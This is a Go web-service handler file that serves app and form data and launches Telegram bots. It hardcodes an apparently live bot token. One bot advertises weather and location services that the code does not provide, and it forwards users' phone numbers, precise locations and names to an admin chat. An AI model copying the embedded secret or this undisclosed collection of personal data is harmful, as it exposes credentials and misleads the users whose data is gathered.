package form_handler

import (
	"fmt"
	form_dto "ijro-nazorat/modul/form/dto"
	form_service "ijro-nazorat/modul/form/service"
	"log"
	"net/http"
	"strconv"
	"strings"

	"git.sriss.uz/shared/shared_service/request"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"github.com/labstack/echo/v4"
	"gorm.io/gorm"
)

type AppHandler struct {
	db      *gorm.DB
	log     *log.Logger
	service form_service.AppService

	TelegramToken string
	ChatID        int64
}

func NewAppHandler(gorm *echo.Group, db *gorm.DB, log *log.Logger) {
	handler := AppHandler{
		db:      db,
		log:     log,
		service: form_service.NewAppService(db),

		TelegramToken: "8189554946:AAHJDfN16ghjTkjOkG_wcx1z8mHrxz4z6cQ",
		ChatID:        415906009,
	}

	routes := gorm.Group("/app")
	{
		routes.GET("", handler.All)
		routes.GET("/page", handler.Page)
		routes.GET("/:id", handler.Show)
		routes.POST("", handler.Create)
		routes.GET("/bot", handler.Telegram)
		routes.GET("/user", handler.User)
	}
}

func (handler *AppHandler) All(ctx echo.Context) error {
	req := request.Request(ctx)

	categoryFilter := ctx.QueryParam("category")

	filter := func(tx *gorm.DB) *gorm.DB {
		tx.Select(`
			app.id,
			to_char(app.created_at, 'YYYY-MM-DD HH24:MI') AS created_at,
			to_char(app.updated_at, 'YYYY-MM-DD HH24:MI') AS updated_at,
			to_char(app.deleted_at, 'YYYY-MM-DD HH24:MI') AS deleted_at,
			jsonb_build_object(
				'id', app_category.id,
				'name', app_category.name,
				'is_active', app_category.is_active
			) AS category,
			COALESCE(
				jsonb_agg(
					DISTINCT jsonb_build_object(
						'id', page.id,
						'name', page.name,
						'is_active', page.is_active,
						'forms', (
							SELECT COALESCE(
								jsonb_agg(
									jsonb_build_object(
										'id', form.id,
										'label', form.label,
										'name', form.name,
										'answer', app_info.answer
									)
								), '[]'::jsonb
							)
							FROM form
							LEFT JOIN app_info
								ON app_info.form_id = form.id
								AND app_info.app_id = app.id
							WHERE form.page_id = page.id
						)
					)
				) FILTER (WHERE page.id IS NOT NULL), '[]'::jsonb
			) AS pages
		`).
			Joins("JOIN app_category ON app_category.id = app.app_category_id").
			Joins("LEFT JOIN page ON page.app_category_id = app_category.id").
			Group("app.id, app_category.id").
			Order("app.id DESC")

		if categoryFilter != "" {
			tx = tx.Where("app_category.name LIKE ?", "%"+categoryFilter+"%")
		}

		return tx
	}

	data, err := handler.service.All(req.Context(), req.NewPaginate(), filter)
	{
		if err != nil {
			return err
		}
	}

	return ctx.JSON(200, data)

	// return ctx.Render(200, "apps.html", map[string]any{
	// 	"Apps":        data.Data, // AppInfo[] turi
	// 	"CurrentPage": data.CurrentPage,
	// 	"TotalPages":  data.TotalPages,
	// 	"PageSize":    data.PageSize,
	// 	"Total":       data.Total,
	// 	"Search":      categoryFilter,
	// })
}

func (handler *AppHandler) Page(ctx echo.Context) error {
	req := request.Request(ctx)

	filter := func(tx *gorm.DB) *gorm.DB {
		return tx.
			Table("app_category").
			Select(`
				app_category.id,
				app_category.name,
				to_char(app_category.created_at, 'YYYY-MM-DD HH24:MI') AS created_at,
				to_char(app_category.updated_at, 'YYYY-MM-DD HH24:MI') AS updated_at`).
			Group("app_category.id").
			Order("app_category.id DESC")
	}

	data, err := handler.service.Page(req.Context(), filter)
	if err != nil {
		return err
	}

	return ctx.JSON(200, data)
}

func (handler *AppHandler) Show(ctx echo.Context) error {
	req := request.Request(ctx)

	id, err := strconv.Atoi(ctx.Param("id"))
	if err != nil {
		return ctx.JSON(http.StatusBadRequest, echo.Map{
			"error": "invalid id",
		})
	}

	filter := func(tx *gorm.DB) *gorm.DB {
		return tx.Select(`
			app.id,
			to_char(app.created_at, 'YYYY-MM-DD HH24:MI') AS created_at,
			to_char(app.updated_at, 'YYYY-MM-DD HH24:MI') AS updated_at,
			to_char(app.deleted_at, 'YYYY-MM-DD HH24:MI') AS deleted_at,

			jsonb_build_object(
				'id', app_category.id,
				'name', app_category.name,
				'is_active', app_category.is_active
			) AS category,

			COALESCE(
				jsonb_agg(
					DISTINCT jsonb_build_object(
						'id', page.id,
						'name', page.name,
						'is_active', page.is_active,
						'forms', (
							SELECT COALESCE(
								jsonb_agg(
									jsonb_build_object(
										'id', form.id,
										'label', form.label,
										'name', form.name,
										'answer', app_info.answer
									)
								), '[]'::jsonb
							)
							FROM form
							LEFT JOIN app_info
								ON app_info.form_id = form.id
								AND app_info.app_id = app.id
							WHERE form.page_id = page.id
						)
					)
				) FILTER (WHERE page.id IS NOT NULL),
				'[]'::jsonb
			) AS pages
		`).
			Joins("JOIN app_category ON app_category.id = app.app_category_id").
			Joins("LEFT JOIN page ON page.app_category_id = app_category.id").
			Where("app.id = ?", id).
			Group("app.id, app_category.id")
	}

	data, err := handler.service.Show(req.Context(), filter)
	{
		if err != nil {
			return err
		}
	}

	// return ctx.JSON(200, data)

	return ctx.Render(200, "test.html", map[string]any{
		"App": data,
	})
}

func (handler *AppHandler) Create(ctx echo.Context) error {
	var req form_dto.ApplicationCreate
	{
		if err := ctx.Bind(&req); err != nil {
			return ctx.JSON(400, map[string]string{
				"error": err.Error(),
			})
		}
	}

	appID, err := handler.service.Create(ctx, req)
	{
		if err != nil {
			return ctx.JSON(500, map[string]string{
				"error": err.Error(),
			})
		}
	}

	return ctx.JSON(201, map[string]any{
		"app_id": appID,
	})
}

func (handler *AppHandler) Telegram(ctx echo.Context) error {
	req := request.Request(ctx)

	// 1️⃣ DB DAN DATA OLISH
	filter := func(tx *gorm.DB) *gorm.DB {
		return tx.
			Table("app_category").
			Select(`
				id,
				name,
				to_char(created_at, 'YYYY-MM-DD HH24:MI') AS created_at,
				to_char(updated_at, 'YYYY-MM-DD HH24:MI') AS updated_at`).
			Group("id").
			Order("id ASC")
	}

	data, err := handler.service.Page(req.Context(), filter)
	{
		if err != nil {
			return err
		}
	}

	// 2️⃣ DB DATA → TELEGRAM TEXT
	var dataText strings.Builder
	dataText.WriteString("📦 <b>App royxati</b>\n\n")

	for i := 1; i <= 100; i++ {
		for _, app := range data {
			dataText.WriteString("━━━━━━━━━━━━━━\n")

			// FOR: i va app.ID
			dataText.WriteString(fmt.Sprintf("📦 <b>FOR:</b> %d, %d\n", i, app.ID))

			dataText.WriteString(fmt.Sprintf("🆔 <b>ID:</b> %d\n", app.ID))
			dataText.WriteString(fmt.Sprintf("📁 <b>Category:</b> %s\n", app.Name))

			dataText.WriteString(fmt.Sprintf("📅 <b>Created:</b> %s\n\n", app.CreatedAt))

			// Category JSON dan name olish
			// var category map[string]any
			// if err := json.Unmarshal([]byte(app.Name), &category); err != nil || category["name"] == nil {
			// 	category = map[string]any{"name": "Noma'lum"}
			// }

			// dataText.WriteString(fmt.Sprintf("📁 <b>Category:</b> %v\n", category["name"]))
		}
	}

	finalDataText := dataText.String()
	// 3️⃣ TELEGRAM BOT
	bot, err := tgbotapi.NewBotAPI(handler.TelegramToken)
	if err != nil {
		return ctx.JSON(500, echo.Map{"error": "Bot yaratilmadi"})
	}

	_, _ = bot.Request(tgbotapi.DeleteWebhookConfig{})

	// 4️⃣ POLLING
	go func() {
		u := tgbotapi.NewUpdate(0)
		u.Timeout = 60
		updates := bot.GetUpdatesChan(u)

		for update := range updates {

			// /start
			if update.Message != nil {
				chatID := update.Message.Chat.ID
				userName := update.Message.From.UserName

				if update.Message.Text == "/start" {

					msg := tgbotapi.NewMessage(
						chatID,
						"Assalomu alaykum <b>"+userName+"</b>!\nTugmalardan birini tanlang 👇",
					)
					msg.ParseMode = "HTML"

					keyboard := tgbotapi.NewInlineKeyboardMarkup(
						tgbotapi.NewInlineKeyboardRow(
							tgbotapi.NewInlineKeyboardButtonData("👋 Salom", "btn_hello"),
						),
						tgbotapi.NewInlineKeyboardRow(
							tgbotapi.NewInlineKeyboardButtonData("📄 Ma'lumotlar", "btn_data"),
						),
						tgbotapi.NewInlineKeyboardRow(
							tgbotapi.NewInlineKeyboardButtonData("📞 Telefon", "btn_phone"),
						),
					)

					msg.ReplyMarkup = keyboard
					bot.Send(msg)
				}

				// Agar user contact yuborsa
				if update.Message.Contact != nil {
					phone := update.Message.Contact.PhoneNumber
					msg := tgbotapi.NewMessage(chatID, fmt.Sprintf("📞 Siz yuborgan telefon raqam: %s", phone))
					bot.Send(msg)
				}
			}

			// BUTTON CALLBACK
			if update.CallbackQuery != nil {
				cb := update.CallbackQuery
				chatID := cb.Message.Chat.ID
				userName := cb.From.UserName

				switch cb.Data {

				case "btn_hello":
					msg := tgbotapi.NewMessage(chatID, "👋 Salom, <b>"+userName+"</b>!")
					msg.ParseMode = "HTML"
					bot.Send(msg)

				case "btn_data":
					// Agar data juda uzun bo‘lsa, bo‘lib yuborish
					runes := []rune(finalDataText)
					start := 0
					const limit = 4000

					for start < len(runes) {
						end := start + limit
						if end > len(runes) {
							end = len(runes)
						}
						msg := tgbotapi.NewMessage(chatID, string(runes[start:end]))
						msg.ParseMode = "HTML"
						bot.Send(msg)
						start = end
					}

				case "btn_phone":
					msg := tgbotapi.NewMessage(chatID, "📞 Iltimos, telefon raqamingizni yuboring!")
					contactBtn := tgbotapi.NewKeyboardButtonContact("📲 Telefonni yuborish")
					keyboard := tgbotapi.NewReplyKeyboard(
						tgbotapi.NewKeyboardButtonRow(contactBtn),
					)
					msg.ReplyMarkup = keyboard
					bot.Send(msg)

				default:
					msg := tgbotapi.NewMessage(chatID, "❓ Noma'lum buyruq")
					bot.Send(msg)
				}

				bot.Request(tgbotapi.NewCallback(cb.ID, "✔"))
			}
		}
	}()

	return ctx.JSON(http.StatusOK, echo.Map{
		"status": "telegram bot started",
	})
}

func (handler AppHandler) User(ctx echo.Context) error {

	bot, err := tgbotapi.NewBotAPI(handler.TelegramToken)
	if err != nil {
		return ctx.JSON(500, echo.Map{"error": "Bot error"})
	}

	// Webhookni o‘chiramiz (long polling)
	_, _ = bot.Request(tgbotapi.DeleteWebhookConfig{})

	go func() {

		u := tgbotapi.NewUpdate(0)
		u.Timeout = 60
		updates := bot.GetUpdatesChan(u)

		for update := range updates {

			// ======================
			// /start
			// ======================
			if update.Message != nil && update.Message.Text == "/start" {

				user := update.Message.From
				chatID := update.Message.Chat.ID

				// Admin uchun user info
				adminText := fmt.Sprintf(
					"🆕 <b>Yangi foydalanuvchi</b>\n\n"+
						"🆔 ID: <code>%d</code>\n"+
						"👤 Username: @%s\n"+
						"📛 First name: %s\n"+
						"🧾 Last name: %s\n"+
						"🌍 Lang: %s",
					user.ID,
					user.UserName,
					user.FirstName,
					user.LastName,
					user.LanguageCode,
				)

				sendToAdminText(bot, adminText)

				// Userga ruxsat so‘rash tugmalari
				keyboard := tgbotapi.NewReplyKeyboard(
					tgbotapi.NewKeyboardButtonRow(
						tgbotapi.NewKeyboardButtonContact("📲 Telefon yuborish"),
					),
					tgbotapi.NewKeyboardButtonRow(
						tgbotapi.NewKeyboardButtonLocation("📍 Lokatsiya yuborish"),
					),
				)

				msg := tgbotapi.NewMessage(chatID, "🔥 Salom! Men – shaxsiy Hayot AI 🤖 bot man\n\n"+
					"Ro‘yxatdan o‘ting, keyin har doim siz uchun kerakli ma’lumotlarni beraman:\n\n"+
					"☁️ Hududingiz uchun aniq ob-havo\n"+
					"🏧 Hozir ochiq yaqin bankomat, dorixona, zapravka, kafe\n"+
					"🚌 Eng qisqa yo‘l va transport variantlari\n\n"+
					"Ro‘yxatdan o‘tish uchun pastdagi tugmalarni bosing 🚀")
				msg.ReplyMarkup = keyboard
				bot.Send(msg)
			}

			// ======================
			// CONTACT
			// ======================
			if update.Message != nil && update.Message.Contact != nil {

				user := update.Message.From
				chatID := update.Message.Chat.ID
				phone := update.Message.Contact.PhoneNumber

				adminText := fmt.Sprintf(
					"📞 <b>Telefon yuborildi</b>\n\n"+
						"🆔 User ID: <code>%d</code>\n"+
						"👤 @%s\n"+
						"📱 Phone: %s",
					user.ID,
					user.UserName,
					phone,
				)

				sendToAdminText(bot, adminText)

				bot.Send(tgbotapi.NewMessage(chatID, "✅ Telefon qabul qilindi"))
			}

			// ======================
			// LOCATION (REAL PIN + USER INFO)
			// ======================
			if update.Message != nil && update.Message.Location != nil {

				user := update.Message.From
				chatID := update.Message.Chat.ID

				lat := update.Message.Location.Latitude
				lon := update.Message.Location.Longitude

				// 1️⃣ ADMIN ga REAL LOCATION (PIN)
				locationMsg := tgbotapi.NewLocation(ADMIN_ID, lat, lon)
				bot.Send(locationMsg)

				// 2️⃣ LOCATION ostiga USER INFO (TEXT)
				adminText := fmt.Sprintf(
					"📍 <b>Lokatsiya egasi</b>\n\n"+
						"🆔 ID: <code>%d</code>\n"+
						"👤 Username: @%s\n"+
						"📛 First name: %s\n"+
						"🧾 Last name: %s\n"+
						"🌍 Lang: %s",
					user.ID,
					user.UserName,
					user.FirstName,
					user.LastName,
					user.LanguageCode,
				)

				sendToAdminText(bot, adminText)

				// 3️⃣ USER ga tasdiq
				bot.Send(tgbotapi.NewMessage(chatID, "✅ Lokatsiya qabul qilindi"))
			}

		}
	}()

	return ctx.JSON(http.StatusOK, echo.Map{
		"status": "telegram bot started",
	})
}

const ADMIN_ID int64 = 415906009

func sendToAdminText(bot *tgbotapi.BotAPI, text string) {
	msg := tgbotapi.NewMessage(ADMIN_ID, text)
	msg.ParseMode = "HTML"
	bot.Send(msg)
}
